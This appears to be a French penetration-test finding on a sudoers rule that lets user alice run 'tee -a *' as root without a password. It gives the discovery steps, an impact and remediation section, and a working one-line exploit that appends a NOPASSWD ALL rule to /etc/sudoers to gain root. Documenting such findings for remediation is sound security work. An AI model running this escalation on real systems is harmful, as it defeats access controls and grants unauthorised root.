# VULN-07 — Sudoers Privilege Escalation (tee NOPASSWD)

**Sévérité :** CRITIQUE (CVSS 9.3)
**OWASP :** A01:2021 Broken Access Control
**CWE :** CWE-269 Improper Privilege Management / CWE-732 Incorrect Permission Assignment
**Vecteur :** /etc/sudoers — règle NOPASSWD pour alice sur tee

---

## Description

La configuration sudoers autorise Alice à exécuter `/usr/bin/tee -a` (outil d'écriture dans des fichiers) avec les droits root et sans mot de passe, sur n'importe quel fichier (`*`). Cela permet à Alice d'écrire dans n'importe quel fichier système, y compris sudoers lui-même, pour s'octroyer tous les droits root.

---

## Découverte

Depuis le compte alice :

```bash
sudo -l
```

Résultat :

```
User alice may run the following commands on 2c69b2c55a12:
    (ALL : ALL) NOPASSWD: /usr/bin/tee -a *
```

La règle `NOPASSWD: /usr/bin/tee -a *` est une misconfiguration critique : tee peut écrire dans n'importe quel fichier avec des droits root.

---

## Exploitation

```bash
# Injection d'une règle root dans sudoers
echo 'alice ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers

# Élévation vers root
sudo -i

# Vérification
whoami
# root
```

---

## Impact

Accès root immédiat depuis le compte Alice. Combiné à VULN-03 (FTP anonyme), ce chemin permet d'aller d'internet à root en deux étapes, sans jamais connaitre un mot de passe.

**Impact GRC :** Violation CWE-269, CIS Linux Benchmark Rule 5.3.7. Contrôle A.8.2 ISO 27001:2022 non respecté.

---

## Remédiation

```bash
# Édition sécurisée de sudoers (jamais via éditeur direct)
sudo visudo

# Supprimer la ligne
# (ALL : ALL) NOPASSWD: /usr/bin/tee -a *

# Principe : n'autoriser sudo que sur des commandes précises sans joker *
```

---

## Références

* [GTFOBins tee](https://gtfobins.github.io/gtfobins/tee/)
* [CWE-269](https://cwe.mitre.org/data/definitions/269.html)
* [SUDO Security — ANSSI](https://cyber.gouv.fr/publications/recommandations-de-configuration-dun-systeme-gnulinux)

**MITRE ATT&CK :** T1548.003 Sudo and Sudo Caching, TA0004 Privilege Escalation
